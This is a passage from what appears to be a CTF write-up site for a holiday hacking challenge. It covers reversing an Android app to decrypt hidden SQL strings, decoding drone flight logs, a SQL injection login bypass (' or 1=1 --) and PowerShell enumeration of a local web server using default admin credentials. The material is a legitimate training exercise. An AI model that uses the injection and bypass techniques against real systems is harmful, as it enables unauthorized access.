$$\\   $$ |$$\\   $$ | *\n*   $$ |  $$ |\\$$$$$$  |\\$$$$$$  |$$$$$$$$\\ \\$$$$$$  |\\$$$$$$  |   *\n *  \\__|  \\__| \\______/  \\______/ \\________| \\______/  \\______/  *\n*         *    \u2744             \u2744           *        \u2744    \u2744    \u2744   *\n   *        *     *     *      *     *      *    *      *      *\n   *  $$$$$$\\  $$$$$$$\\   $$$$$$\\  $$\\   $$\\ $$$$$$$$\\ $$$$$$$$\\ $$$$$$$\\  $$\\  *\n   * $$  __$$\\ $$  __$$\\ $$  __$$\\ $$$\\  $$ |\\__$$  __|$$  _____|$$  __$$\\ $$ | *\n  *  $$ /  \\__|$$ |  $$ |$$ /  $$ |$$$$\\ $$ |   $$ |   $$ |      $$ |  $$ |$$ |*\n  *  $$ |$$$$\\ $$$$$$$  |$$$$$$$$ |$$ $$\\$$ |   $$ |   $$$$$\\    $$ |  $$ |$$ | *\n *   $$ |\\_$$ |$$  __$$&lt; $$  __$$ |$$ \\$$$$ |   $$ |   $$  __|   $$ |  $$ |\\__|*\n  *  $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\\$$$ |   $$ |   $$ |      $$ |  $$ |   *\n*    \\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \\$$ |   $$ |   $$$$$$$$\\ $$$$$$$  |$$\\ *\n *    \\______/ \\__|  \\__|\\__|  \\__|\\__|  \\__|   \\__|   \\________|\\_______/ \\__|  *\n  *                                                            \u2744    \u2744    \u2744   *\n   *      *    *    *    *    *    *    *    *    *    *    *    *    *    *                                                                                                                                        \n</code></pre>"},{"location":"objectives/o6-2/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Brilliant work! We now have access to\u2026 the Wish List! I couldn't have done it without you\u2014thank you so much!</p>"},{"location":"objectives/o7/","title":"Mobile Analysis","text":"<p>Difficulty:  Debug Version: SantaSwipe.apk Release Version: SantaSwipeSecure.aab</p>"},{"location":"objectives/o7/#objective","title":"Objective","text":"<p>Request</p> <p>Help find who has been left out of the naughty AND nice list this Christmas. Please speak with Eve Snowshoes for more information.</p> Eve Snowshoes <p>Hi there, tech saviour! Eve Snowshoes and Team Alabaster in need of assistance.</p> <p>I've been busy creating and testing a modern solution to Santa\u2019s Naughty-Nice List, and I even built an Android app to streamline things for Alabaster\u2019s team.</p> <p>But here\u2019s my tiny reindeer-sized problem: I made a debug version and a release version of the app.</p> <p>I accidentally left out a child's name on each version, but for the life of me, I can't remember who!</p> <p>Could you start with the debug version first, figure out which child\u2019s name isn\u2019t shown in the list within the app, then we can move on to release? I\u2019d be eternally grateful!</p>"},{"location":"objectives/o7/#hints","title":"Hints","text":"Mobile Analysis Easy - Tools <p>Try using apktool. or jadx..</p> Mobile Analysis Easy - Missing <p>Maybe look for what names are included and work back from that?</p> Mobile Analysis Hard - Format <p>So yeah, have you heard about this new Android app format? Want to convert it to an APK file?</p> Mobile Analysis Hard - Encryption and Obfuscation <p>Obfuscated and encrypted? Hmph. Shame you can't just run strings on the file.</p>"},{"location":"objectives/o7/#solution","title":"Solution","text":""},{"location":"objectives/o7/#easy-mode","title":"Easy Mode","text":"<p>I started this challenge by downloading the SantaSwipe.apk. Using apktool as suggesed in the hints, I extracted this android package to analize it further.</p> <pre><code>apktool d SantaSwipe.apk -o santaswipe-debug\n</code></pre> <p>I started looking at the \"assets\" folder, and here I noticed index.html, which the application seems to be using for its front-end. What got my attention was the following code:</p> <p><pre><code>// Functions to request lists from the Android side\nfunction showNormalList() {\n    Android.getNormalList();\n    document.getElementById('header').innerHTML = '&lt;h2 class=\"illumination\"&gt;Unlisted&lt;/h2&gt;';\n}\n\nfunction showNiceList() {\n    Android.getNiceList();\n    document.getElementById('header').innerHTML = '&lt;h2 class=\"illumination\"&gt;Nice&lt;/h2&gt;';\n}\n\nfunction showNaughtyList() {\n    Android.getNaughtyList();\n    document.getElementById('header').innerHTML = '&lt;h2 class=\"illumination\"&gt;Naughty&lt;/h2&gt;';\n}\n</code></pre> I then ran a grep to identify where these finctions are being used.</p> NormalListNiceListNoughtyList <pre><code>find . -type f | xargs grep \"NormalList\"\n</code></pre> <pre><code>find . -type f | xargs grep \"NiceList\"\n</code></pre> <pre><code>find . -type f | xargs grep \"NaughtyList\"\n</code></pre> <p>It was clear that most of the code that handles the Lists was in 2 files located in \"./smali_classes3/com/northpole/santaswipe\" folder: DatabaseHelper.smali MainActivity$WebAppInterface.smali</p> <p>Looking at the code, the following line makes what we are looking for very evident.</p> <pre><code>const-string v3, \"SELECT Item FROM NormalList WHERE Item NOT LIKE \\'%Ellie%\\'\"\n</code></pre> <p>We found the child that was left out!</p> <p>Ellie</p> Eve Snowshoes <p>Aha! Success! You found it!</p> <p>Thanks for staying on your toes and helping me out\u2014every step forward keeps Alabaster\u2019s plans on track. You're a real lifesaver!</p> <p>...</p> <p>Nice job completing the debug version\u2014smooth as a sleigh ride on fresh snow!</p> <p>But now, the real challenge lies in the obfuscated release version. Ready to dig deeper and show Alabaster\u2019s faction your skills?</p>"},{"location":"objectives/o7/#hard-mode","title":"Hard Mode","text":"<p>Looking at the hints and at the file with extension .aab, it is given that we need convert this file to an apk which we can investigate in the same way we did in the easy challenge. The software to use is given, and after downloading it, we can run it to convert the .aab format to .apks. AAB packages seem to be natively signed, while APK files are not, though APKS files could be. As we do not have a signing key, the APKS will still not be signed.</p> <pre><code>./bundletool-all-1.17.2.jar  build-apks --bundle=./SantaSwipeSecure.aab --output=./SantaSwipeSecure.apks --mode=universal\n</code></pre> <p>Next, we unzip the apks file to reveal the universal.apk file as converted by the bundletool.</p> <pre><code>root@kali:~/hhc2024/obj7/hard# unzip SantaSwipeSecure.apks -d ./apks-extracted\nArchive:  SantaSwipeSecure.apks\n extracting: ./apks-extracted/toc.pb  \n extracting: ./apks-extracted/universal.apk  \n</code></pre> <p>For the next step, the JADX Tool is more helpful in decoding the Java code.</p> <pre><code>root@kali:~/hhc2024/obj7/hard/apks-extracted# curl -L -o /opt/jadx.zip \"https://github.com/skylot/jadx/releases/download/v1.5.0/jadx-1.5.0.zip\" \\\n    &amp;&amp; unzip /opt/jadx.zip -d /opt/jadx \\\n    &amp;&amp; rm /opt/jadx.zip \n    &amp;&amp; chmod +x /opt/jadx/bin/jadx /opt/jadx/bin/jadx-gui \noot@kali:~/hhc2024/obj7/hard/apks-extracted# /opt/jadx/bin/jadx universal.apk -d ./java-code\n</code></pre> <p>Looking for the source code, we can located it in \"./sources/com/northpole/santaswipe\" folder, with the two main files being: MainActivity.java DatabaseHelper.java</p> <p>The DatabaseHelper.java file includes some encrypted data which we need to decrypt. As explained in the hint about encryption and obfuscation, we can find the encryptionKey and iv in  the android resource file: strings.xml</p> <pre><code>String string = context.getString(R.string.ek);\n...\nString string2 = context.getString(R.string.iv);\n</code></pre> <p>Next step is to build an application that will decrypt the queries for us. I asked chatty to do this in python, which it did, after some struggle with padding, but then I also tried to have this done in JAVA, to utilise the same source code which the app itself is using.</p> <pre><code>root@kali:~/hhc2024/obj7/hard# java DecryptionHelper \"IVrt+9Zct4oUePZeQqFwyhBix8cSCIxtsa+lJZkMNpNFBgoHeJlwp73l2oyEh1Y6AfqnfH7gcU9Yfov6u70cUA2/OwcxVt7Ubdn0UD2kImNsclEQ9M8PpnevBX3mXlW2QnH8+Q+SC7JaMUc9CIvxB2HYQG2JujQf6skpVaPAKGxfLqDj+2UyTAVLoeUlQjc18swZVtTQO7Zwe6sTCYlrw7GpFXCAuI6Ex29gfeVIeB7pK7M4kZGy3OIaFxfTdevCoTMwkoPvJuRupA6ybp36vmLLMXaAWsrDHRUbKfE6UKvGoC9d5vqmKeIO9elASuagxjBJ\"\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nDecrypted text 1: CREATE TRIGGER DeleteIfInsertedSpecificValue\n    AFTER INSERT ON NormalList\n    FOR EACH ROW\n    BEGIN\n        DELETE FROM NormalList WHERE Item = 'KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8=';\n    END;\n</code></pre> <p>We notice the value for the Item in the WHERE statement is also encrypted, so we decrypt that as well.</p> <pre><code>root@kali:~/hhc2024/obj7/hard# java DecryptionHelper KGfb0vd4u/4EWMN0bp035hRjjpMiL4NQurjgHIQHNaRaDnIYbKQ9JusGaa1aAkGEVV8=\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nDecrypted text 1: Joshua, Birmingham, United Kingdom\n</code></pre> <p>We found the child that was left out and have been awarded the Gold Trophy!</p> <p>Joshua</p>"},{"location":"objectives/o7/#response","title":"Response","text":"Eve Snowshoes <p>Aha! Success! You found it!</p> <p>Thanks for staying on your toes and helping me out\u2014every step forward keeps Alabaster\u2019s plans on track. You're a real lifesaver!</p>"},{"location":"objectives/o8/","title":"Drone Path","text":"<p>Difficulty:  Direct link: Drone Path</p>"},{"location":"objectives/o8/#objective","title":"Objective","text":"<p>Request</p> <p>Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.</p> Chimney Scissorsticks <p>Hey. Psst, over here. Hey, I'm Chimney Scissorsticks.</p> <p>I'm not liking all the tension brewing between the factions, so even though I agreed with how Wombley was handling things, I get the feeling this is going to end poorly for everyone. So I'm trying to get this data to Alabaster's side. Can you help?</p> <p>Wombley's planning something BIG in that toy factory. He's not really making toys in there. He's building an armada of drones!</p> <p>They're packed with valuable data from the elves working on the project. I think they hide the admin password in the drone flight logs. We need to crack this to prevent this escalating snowball showdown.</p> <p>You'll be working with KML files, tracking drone flight paths. Intriguing, right? We need every detail to prepare for what\u2019s ahead!</p> <p>Use tools like Google Earth and some Python scripting to decode the hidden passwords and codewords locked in those files.</p> <p>Ready to give it a go? It\u2019s going to be a wild ride, and your skills might just turn the tide of this conflict!</p>"},{"location":"objectives/o8/#solution","title":"Solution","text":""},{"location":"objectives/o8/#easy-mode","title":"Easy Mode","text":"<p>The challenge is based on a web application that has the Home, FileShare and Login available when we first access it. The FileShare provides a file called fritjolf-Path.kml. I downloaded this file and uploaded it to Google Earth. This gave us a message displayed over Antartica, GUMDROP1</p> <p></p> <p>This is the password so looking for a username is just a matter of looking at the pilot which has constructed this path, fritjolf.</p> <p>Using this information we are able to login as user fritjolf.</p> <p>In addition to the previous menus, we now have access to the Workshop, Profile and Admin Console. Looking at the Profile, Fritjolf has left a note to self noting that the drone name is in the same location as secret snowball warehouses /files/secret/Preparations-drone-name.csv. This is a CSV File 8 Geolocation points which we can plot. I asked Chatty to generate a KML file for these coordinates and it provided me with drone-name.kml</p> <p>Looking at these geolocation, we can see that each location represents a letter.</p> <p></p> <p>ELF-HAWK</p> <p>Using this in the Workshop, we are presented with information about this Drone. </p> ELF-HAWK <p>Name: ELF-HAWK, Quantity: 40, Weapons: Snowball-launcher</p> <p>These drones will work great to find Alabasters snowball warehouses. I have hid the activation code in the dataset ELF-HAWK-dump.csv. We need to keep it safe, for now it's under /files/secret.</p> <p>We need to make sure we have enough of these drones ready for the upcoming operation. Well done on hiding the activation code in the dataset. If anyone finds it, it will take them a LONG time or forever to carve the data out, preferably the LATTER.</p> <p>I asked Chatty to give me a script to plot the coordinates in the ELF-HAWK-dump.csv file, which returned the following code:</p> <pre><code>import pandas as pd\nimport matplotlib.pyplot as plt\n\n# Load the CSV file\ncsv_file_path = './ELF-HAWK-dump.csv'\ndata = pd.read_csv(csv_file_path)\n\nfiltered_data = data\n\n# Plot the coordinates from OSD.longitude and OSD.latitude columns\nplt.figure(figsize=(10, 6))\nplt.plot(filtered_data['OSD.longitude'], filtered_data['OSD.latitude'], 'bo-', markersize=3)\nplt.xlabel('Longitude')\nplt.ylabel('Latitude')\nplt.grid(True)\nplt.show()\n</code></pre> <p></p> <p>CODEWORD: DroneDataAnalystExpertMedal</p> <p>Success: Code accepted!</p> <p>You may now steer the fleet of drones. You are officially certified as a Drone Data Analyst Expert!</p> Chimney Scissorsticks <p>Bravo! You've tackled the drone challenge and navigated through those KML files like a true expert. Your skills are just what we need to prevent the big snowball battle\u2014the North Pole thanks you!</p> <p>Well done! You cracked the code from the drones and showed you've mastered the basics of KML files. This kind of expertise will be invaluable as we gear up for what\u2019s ahead!</p> <p>But I need you to dig deeper. Make sure you\u2019re checking those file structures carefully, and remember\u2014rumor has it there is some injection flaw that might just give you the upper hand. Keep your eyes sharp!</p>"},{"location":"objectives/o8/#hard-mode","title":"Hard Mode","text":"<p>Following the additional Tips from the conversation with Chimney Scissorsticks, we are told there is an injection flaw, that immediately points to SQL Injection. This is not difficult to trigger and can be used in the Login as well as the Workshop. </p> <p>Statement Tested: ' or 1=1 --</p> <p>This returns the full list of Drones available:</p> <p>Name: ELF-HAWK, Quantity: 40, Weapons: Snowball-launcher Name: Pigeon-Lookalike-v4, Quantity: 20, Weapons: Surveillance Camera Name: FlyingZoomer, Quantity: 4, Weapons: Snowball-Dropper Name: Zapper, Quantity: 5, Weapons: CarrotSpike</p> <p>We already had ELF-HAWK, and from the rest, the most interesting one is Pigeon-Lookalike-v4 as it gives us the comment:</p> <p>I heard a rumor that there is something fishing with some of the files. There was some talk about only TRUE carvers would find secrets and that FALSE ones would never find it.</p> <p>The idea of True or False follows the binary concept of ones and zeroes. The ELF-HAWK-dump.csv has a large number of columns that are listed as True or False, so I asked Chatty to parse the file and give the the values for these columns as ones and zeroes, and then convert the binary values to ascii. </p> <pre><code>import pandas as pd\nimport matplotlib.pyplot as plt\n\n# Load the CSV file\ncsv_file_path = './download.csv'  # File path provided by user\ndata = pd.read_csv(csv_file_path)\n\n# Identify columns with literal TRUE/FALSE values\nboolean_columns = []\nfor column in data.columns:\n    if data[column].dropna().isin([True, False]).all() and data[column].dtype == 'bool':\n        boolean_columns.append(column)\n\n# Filter only boolean columns and convert TRUE/FALSE to 1/0\nboolean_data = data[boolean_columns].copy()\nboolean_data = boolean_data.replace({True: 1, False: 0})\n\n# Concatenate binary strings from all rows, ignoring rows with all values set to 0\nfull_binary_string = ''\nfor index, row in boolean_data.iterrows():\n    if row.sum() == 0:\n        continue  # Ignore rows with all values set to False (0)\n\n    # Convert row values to binary string and concatenate to the full string\n    full_binary_string += ''.join(row.astype(str))\n\n# Print the full concatenated binary string\nprint(\"Full Binary Value:\")\nprint(full_binary_string)\n\n# Convert the full binary string to ASCII representation with byte length of 8\nascii_representation = ''\nfor i in range(0, len(full_binary_string), 8):\n    byte = full_binary_string[i:i+8]\n    if len(byte) == 8:\n        ascii_char = chr(int(byte, 2))\n        if ascii_char == '\\n':\n            ascii_representation += '\\r\\n'\n        else:\n            ascii_representation += ascii_char\n\n# Print the ASCII representation\nprint(\"ASCII Representation:\")\nprint(ascii_representation)\n</code></pre> CODEWORD: EXPERTTURKEYCARVERMEDAL <pre><code>:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*::::::::::::::::::\n:::::::::::::::::::::::::::::::-------------=--------::::::::::::::::::::::::::::::::::::\n::::::::::::::::::::::------------------------===-=======--=-::::::::::-:::::::::::::::::\n::::::::::::::::::::------------:------------=-====================---:::::::::=+::::::::\n:::::::::::::::::------------------------------=====================-------::::::::::::::\n::::::::::::::-------------------------------------================:------:::::::::::::::\n::::::::::::--------------------------------------==============-::--------:::::::::-::::\n::::::::::::-------:--------@+:::::::::--=@--------:===========-::-::----==---:::::::::::\n::::-------:::::----------@---::::::---+-==+@--------=========-:--:------=====---::::::::\n::::--------::::::-------#--------------=-+@------------===------::-----====--==---::::::\n::::-------:-:::::::------@=@=++#+++++@@@@@=-----------------:::--------------==---::::::\n::::----------::::=-#-:----**%@+++++++%@@=::::::---%@------:--------:--@-+::-------::::::\n::::-----:----:::::::::::--::@@**%@--::::::::::::::--=+@------------@--:::::------@::::::\n::::---+@::::::---+@:::::::::#@-@--:::::-:=*=-::-----=+*=*=--------@:--:::::::-----=:::::\n::::@-:::-::::::-----=@:-:::@+@%---------------==-==+@@@@@=@------@---------:::::--==+%::\n:::#:::::::::::-----=+*@:::%#@#-=---------===++*%@@+@=+*#-+*=@-----#====-----------**-%::\n::@--::-:::--:---==++*@-:@=+@=+-@=*+++++++**@#%*@-##**-@##%=#%@@@@#*@###@=+**@*****@@@:::\n:::@*=--++++++++**@@@@@@*#@-+%@*=*+****@@@+@***@%@@%%%@-%@*@@@@@@@@@@@@@@%%#%%%@@@@@%::::\n:::@@@@@@@++#*####@@@@@@@==---====+##@*%=+@*@*%%@@@@@@@@@@@@@@@=--@+@@@@+@@@@@@@@@@-:::::\n::::=*%%%%%%%%%%%@@%@@#@-#*+++++====@-++###@%@*@@@@+@@@@-**+--::::--@@%@%%@%%%%%@@@-:::::\n::::---@@@@##@@@@@@@@@--+@%-#+#**+=+++**%@@@@@@@##%**%--:::::::--*----=*@@@@@@@*@@---::::\n::::---@@***%%%%@@@@*@-=-+=@#=#%##***##@@@@@#@@*@%%==---:::::::::::----=+---------=--::::\n::::----@+=%#@@@=@@-----##@+:-=%@@%##%@@@@@@@@@@@@*+=-----::::::::::::=+*-@:----===--::::\n::::---------------------*@##=+@@%@==-+@@@@@@@@@@@-+=---------------===+**--=======-:::::\n:::---------------:------%+#%@@@@@#%%%%@@@@#@@@@@@@-+======---------==***#@========-:::::\n:::-%-%---------:---------*-*##%@@@@@@@@@@@@@@@@@--=@@-*===++++++++++***@*===++++++=-::::\n:::--+---------=-------:-----#==#@%%%@@@@@*@%@@@----@+@@@=***@@@@***@@@@%===++++-++=-::::\n:::--------------:::::--------------##-----@@--------@%@#@@%%%%@@@@@@#@=====+++++++=-::::\n:::---------------::::::---------------------=====---@@##@@@@@@@@@@@#%#-=====+++++--:::::\n:::---======-------------------------=----==========--*=@@%@++*@@%%%@@-======:----==-::::\n:::---===============------------------===============-----#@@@@@-----===-::---=====-::::\n:::--=============+===--------------===-==================--------======::----=======-:::\n:::--================---::::-=======-======================+=====+====::------===+===-:::\n:::--===================--:::::====================+====-:---==+++=::-----=======---=-:::\n:::--========:===========------:=====================:::-----====:-----==========+===-:::\n/ ___/ _ \\|  _ \\| ____\\ \\      / / _ \\|  _ \\|  _ \\   _____  ====:-----==========+===-:::\n| |  | | | | | | |  _|  \\ \\ /\\ / / | | | |_) | | | | |_____| ====:-----==========+===-:::\n| |__| |_| | |_| | |___  \\ V  V /| |_| |  _ &lt;| |_| | |_____| ====:-----==========+===-:::\n\\____\\___/|____/|_____|__\\_/\\_/__\\___/|_| \\_\\____/  _  _________   ______    _    ____  \n| ____\\ \\/ /  _ \\| ____|  _ \\_   _|_   _| | | |  _ \\| |/ / ____\\ \\ / / ___|  / \\  |  _ \\ \n|  _|  \\  /| |_) |  _| | |_) || |   | | | | | | |_) | ' /|  _|  \\ V / |     / _ \\ | |_) |\n| |___ /  \\|  __/| |___|  _ &lt; | |   | | | |_| |  _ &lt;| . \\| |___  | || |___ / ___ \\|  _ &lt; \n|_____/_/\\_\\_| __|_____|_|_\\_\\|_| __|_|  \\___/|_| \\_\\_|\\_\\_____| |_| \\____/_/   \\_\\_| \\_\\\n\\ \\   / / ____|  _ \\|  \\/  | ____|  _ \\  / \\  | |    ==========---======++++=+=--+++=-:::\n\\ \\ / /|  _| | |_) | |\\/| |  _| | | | |/ _ \\ | |    ==========---======++++=+=--+++=-:::\n\\ V / | |___|  _ &lt;| |  | | |___| |_| / ___ \\| |___ ==========---======++++=+=--+++=-:::\n\\_/  |_____|_| \\_\\_|  |_|_____|____/_/   \\_\\_____|==========---======++++=+=--+++=-:::\n::::--====+++=---++++++=+========------::::=-:---==============---======++++=+=--+++=-:::\n::::--==+++++++==---+++++++++++========-----================++++==-========-++=++====-:::\n:::::--====+++++-++--++++++++++=--------=-==============+++---------=====++=+++++::::::::\n::::::::======+++=+++=+++++++++++++++=++++===========++++:-------=---=-=----:::::::::::::\n::::::::::::::::--=-=======++=++++++++++++++============--------------:::::::::::::::::::\n:::::::::::::::::::::::::::------===-==-===-==-----::-:::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\n</code></pre> <p>Success: Code accepted!</p> <p>You may now take over the production of drones. You are officially certified as Super Admin Drone Data Analyst Expert!</p>"},{"location":"objectives/o8/#images","title":"Images","text":""},{"location":"objectives/o8/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Absolutely fantastic! I think you found the most difficult path in, from file carving to SQL injection. Not many can do that, but you've shown you\u2019re ready for anything the factions throw your way!</p>"},{"location":"objectives/o9/","title":"PowerShell","text":"<p>Difficulty:  Direct link: PowerShell Terminal</p>"},{"location":"objectives/o9/#objective","title":"Objective","text":"<p>Request</p> <p>Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here.</p> <p>You've probably heard the latest\u2014things are getting tense around here with all the faction business between Wombley and Alabaster. But, let\u2019s focus on this PowerShell Terminal for now.</p> <p>This is the remote access for our snowball weaponry. We programmed some defense mechanisms to deter intruders, but the system is in a faulty lockdown state.</p> <p>I certainly wasn't the one that programmed the mechanism. Nope not me. But can you help me find a way through it so I can regain access?</p> <p>There's two functions I need access to. The snow cannon terminal, which should be easier. And the snow cannon production and deployment plans. That one's better defended.</p> <p>Still, I've got faith in you. We need every advantage we can get right now, and you might be just the one to tip the balance.</p> <p>So, think you can do it? Are you ready to show what you've got?</p>"},{"location":"objectives/o9/#hints","title":"Hints","text":"PowerShell Admin Access - Total Control <p>I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to <code>Get-FileHash -Algorithm SHA256</code>.</p> PowerShell Admin Access - Fakeout EDR Threshold <p>They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response \"EDR\". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!.</p>"},{"location":"objectives/o9/#solution","title":"Solution","text":""},{"location":"objectives/o9/#easy-mode","title":"Easy Mode","text":"<p>This challenge is a terminal requesting ways of using powershell.</p> <p>Welcome to PowerShell MFA challenge! Type hintme for hints.</p> <p>Are you ready to begin?</p> <p>1) There is a file in the current directory called 'welcome.txt'. Read the contents of this file</p> <pre><code>PS /home/user&gt; Get-Content -Path ./welcome.txt\nSystem Overview\nThe Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.\n\nLockdown Protocols\nWhen the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered.\n\nAccess and System Restoration\nTo restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.\n</code></pre> <p>2) Geez that sounds ominous, I'm sure we can get past the defense mechanisms. We should warm up our PowerShell skills. How many words are there in the file?</p> <pre><code>PS /home/user&gt; (((Get-Content -Path ./welcome.txt) -split ' ' | Where-Object { $_ -ne '' })).Count\n180\n</code></pre> <p>3) There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?</p> <pre><code>PS /home/user&gt; netstat -ano | Select-String \"LISTEN\"\n\ntcp        0      0 127.0.0.1:1225          0.0.0.0:*               LISTEN      off (0.00/0/0)\nunix  2      [ ACC ]     STREAM     LISTENING     233298477 /tmp/tmux-1050/default\nunix  2      [ ACC ]     STREAM     LISTENING     233368394 /tmp/dotnet-diagnostic-429-17080198-socket\nunix  2      [ ACC ]     STREAM     LISTENING     233371070 /tmp/CoreFxPipe_PSHost.DB3CEBA7.429.None.pwsh\n</code></pre> <p>4) You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?</p> <pre><code>PS /home/user&gt; Invoke-WebRequest http://127.0.0.1:1225\nInvoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).\n</code></pre> <p>5) It looks like defensive measures are in place, it is protected by basic authentication. Try authenticating with a standard admin username and password.</p> <pre><code>PS /home/user&gt; $credentials = Get-Credential                                                                    \nPowerShell credential request\nEnter your credentials.\nUser: admin\nPassword for user admin: *****\n\nPS /home/user&gt; Invoke-WebRequest http://127.0.0.1:1225 -Credential $credentials -AllowUnencryptedAuthentication \n\nStatusCode        : 200\nStatusDescription : OK\nContent           : &lt;html&gt;\n                    &lt;body&gt;\n                    &lt;pre&gt;\n                    ----------------------------------------------------\n                    \ud83e\ude96 Elf MFA webserver\ud83e\ude96\n                    \u2694\ufe0f Grab your tokens for access to weaponry \u2694\ufe0f\n                    \u2694\ufe0f Warning! Sensitive information on the server, protect a\u2026\nRawContent        : HTTP/1.1 200 OK\n                    Server: Werkzeug/3.0.6\n                    Server: Python/3.10.12\n                    Date: Fri, 22 Nov 2024 14:52:09 GMT\n                    Connection: close\n                    Content-Type: text/html; charset=utf-8\n                    Content-Length: 3475\n\n                    &lt;html&gt;\n                    &lt;body&gt;\n                    &lt;pre&gt;\n                    ---\u2026\nHeaders           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]\u2026}\nImages            : {}\nInputFields       : {}\nLinks             : {@{outerHTML=&lt;a href=\"http://localhost:1225/endpoints/1\"&gt;Endpoint 1&lt;/a&gt;; tagName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=&lt;a href=\"http://localhost:1225/endpoints/2\"&gt;Endpoint 2&lt;/a&gt;; tagName=A; href=http://localhost:1225/endpoints/2}, @{outerHTML=&lt;a href=\"http://localhost:1225/endpoints/3\"&gt;Endpoint 3&lt;/a&gt;; tagName=A; href=http://localhost:1225/endpoints/3}, @{outerHTML=&lt;a href=\"http://localhost:1225/endpoints/4\"&gt;Endpoint 4&lt;/a&gt;;tagName=A; href=http://localhost:1225/endpoints/4}\u2026}\nRawContentLength  : 3475\nRelationLink      : {}\n</code></pre> <p>6) There are too many endpoints here. Use a loop to download the contents of each page. What page has 138 words? When you find it, communicate with the URL and print the contents to the terminal.</p> <pre><code>PS /home/user&gt; $links = (Invoke-WebRequest http://127.0.0.1:1225 -Credential $credentials -AllowUnencryptedAuthentication).Links  \nPS /home/user&gt; foreach ($link in $links) { $link.href; ((Invoke-WebRequest $link.href).Content -split ' ' | Where-Object { $_ -ne '' }).Count }\nhttp://localhost:1225/endpoints/1              \n130                                            \nhttp://localhost:1225/endpoints/2              \n127                                            \nhttp://localhost:1225/endpoints/3              \n162                                            \nhttp://localhost:1225/endpoints/4              \n156                                            \nhttp://localhost:1225/endpoints/5              \n162                                            \nhttp://localhost:1225/endpoints/6              \n147                                            \nhttp://localhost:1225/endpoints/7              \n165                                            \nhttp://localhost:1225/endpoints/8              \n159                                            \nhttp://localhost:1225/endpoints/9              \n159                                            \nhttp://localhost:1225/endpoints/10             \n142                                            \nhttp://localhost:1225/endpoints/11             \n150                                            \nhttp://localhost:1225/endpoints/12             \n123                                            \nhttp://localhost:1225/endpoints/13             \n138 \n&lt;TRUNKATED&gt;\nPS /home/user&gt; (Invoke-WebRequest http://127.0.0.1:1225/endpoints/13).Content\n&lt;html&gt;&lt;head&gt;&lt;title&gt;MFA token scrambler&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Yuletide cheer fills the air,&lt;br&gt;    A season of love, of care.&lt;br&gt;    The world is bright, full of light,&lt;br&gt;    As we celebrate this special night.&lt;br&gt;    The tree is trimmed, the stockings hung,&lt;br&gt;    Carols are sung, bells are rung.&lt;br&gt;    Families gather, friends unite,&lt;br&gt;    In the glow of the fire\u2019s light.&lt;br&gt;    The air is filled with joy and peace,&lt;br&gt;    As worries and cares find release.&lt;br&gt;    Yuletide cheer, a gift so dear,&lt;br&gt;    Brings warmth and love to all near.&lt;br&gt;    May we carry it in our hearts,&lt;br&gt;    As the season ends, as it starts.&lt;br&gt;    Yuletide cheer, a time to share,&lt;br&gt;    The love, the joy, the care.&lt;br&gt;    May it guide us through the year,&lt;br&gt;    In every laugh, in every tear.&lt;br&gt;    Yuletide cheer, a beacon bright,&lt;br&gt;    Guides us through the winter night &lt;/p&gt;&lt;p&gt; Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>7) There seems to be a csv file in the comments of that page. That could be valuable, read the contents of that csv-file!</p> <pre><code>PS /home/user&gt; (Invoke-WebRequest http://127.0.0.1:1225/token_overview.csv -Credential $credentials -AllowUnencryptedAuthentication).Content\nfile_MD5hash,Sha256(file_MD5hash)              \n04886164e5140175bafe599b7f1cacc8,REDACTED\n664f52463ef97bcd1729d6de1028e41e,REDACTED\n&lt;TRUNCATED&gt;  